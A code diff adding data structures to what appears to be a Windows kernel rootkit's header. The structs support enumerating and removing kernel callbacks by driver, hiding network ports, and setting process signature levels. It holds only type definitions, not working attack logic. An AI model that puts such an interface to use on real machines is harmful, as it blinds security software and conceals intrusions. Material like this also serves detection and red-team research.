@@ -55,6 +55,7 @@ constexpr unsigned long IOCTL_EXEC_SCRIPT = static_cast<unsigned long>(CTL_CODE_
 
 constexpr SIZE_T REG_VALUE_LEN = 260;
 constexpr SIZE_T REG_KEY_LEN = 255;
+constexpr SIZE_T MAX_DRIVER_PATH = 256;
 
 // Structs
 enum CallbackType {
@@ -72,6 +73,30 @@ struct IoctlKernelCallback {
 	CallbackType Type;
 	unsigned long long CallbackAddress;
 	bool Remove;
+};
+
+template<typename CallbackListType>
+struct IoctlCallbackList {
+	CallbackType Type;
+	SIZE_T Count;
+	CallbackListType* Callbacks;
+};
+
+struct ObCallback {
+	PVOID PreOperation;
+	PVOID PostOperation;
+	CHAR DriverName[MAX_DRIVER_PATH];
+};
+
+struct PsRoutine {
+	unsigned long long CallbackAddress;
+	CHAR DriverName[MAX_DRIVER_PATH];
+};
+
+struct CmCallback {
+	unsigned long long CallbackAddress;
+	unsigned long long Context;
+	CHAR DriverName[MAX_DRIVER_PATH];
 };
 
 enum class FileType {
@@ -158,12 +183,19 @@ enum class PortType {
 };
 
 struct IoctlHiddenPort {
+	bool Hide;
+	bool Remote;
+	PortType Type;
+	unsigned short Port;
+};
+
+struct IoctlHiddenPortEntry {
 	bool Remote;
 	unsigned short Port;
 };
 
 struct IoctlHiddenPorts {
-	IoctlHiddenPort* Ports;
+	IoctlHiddenPortEntry* Ports;
 	SIZE_T Count;
 	PortType Type;
 };
@@ -177,6 +209,12 @@ enum class ProcessType {
 struct IoctlProcessEntry {
 	unsigned long Pid;
 	bool Remove;
+};
+
+struct IoctlProcessSignature {
+	unsigned long Pid;
+	unsigned char SignerType;
+	unsigned char SignatureSigner;
 };
 
 struct IoctlProcessList {
